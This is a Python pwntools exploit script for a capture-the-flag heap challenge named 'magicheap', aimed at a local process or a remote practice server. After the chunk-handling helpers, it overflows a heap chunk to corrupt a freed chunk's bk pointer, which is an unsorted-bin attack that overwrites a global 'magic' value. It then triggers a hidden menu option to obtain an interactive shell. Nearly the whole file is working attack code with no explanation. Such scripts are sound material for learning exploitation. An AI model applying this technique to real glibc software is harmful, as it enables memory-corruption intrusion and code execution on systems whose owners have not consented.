# coding:utf-8
from pwn import *
context.log_level = 'debug'

proc_name = 'magicheap'
islocal = 1
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF(proc_name)

if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 27694)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def create(size, content):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Size of Heap : ')
    p.sendline(str(size))
    p.recvuntil('Content of heap:')
    p.sendline(content)

def edit(idx, size, content):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Index :')
    p.sendline(str(idx))
    p.recvuntil('Size of Heap :')
    p.sendline(str(size))
    p.recvuntil('Content of heap :')
    p.sendline(content)

def delete(idx):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Index :')
    p.sendline(str(idx))

def pwn():
    p.recvuntil('Your choice :')
    p.sendline('4869')
    p.interactive()

if __name__ == '__main__':
    create(0x20, 'aaaa')
    # debug(0)
    create(0x80, 'bbbb')
    # debug(0)
    create(0x30, 'cccc')
    # debug(0)
    delete(1)
    # debug(0)

    magic_addr = 0x6020a0
    payload1  = 0x20 * 'c'
    payload1 += p64(0)                  # prev_size
    payload1 += p64(0x91)               # size
    payload1 += p64(0)                  # fd
    payload1 += p64(magic_addr-0x10)    # bk
    
    edit(0, 0x40, payload1)
    debug(0)
    create(0x80, 'dddd')
    # debug(0)
    # pause()
    pwn()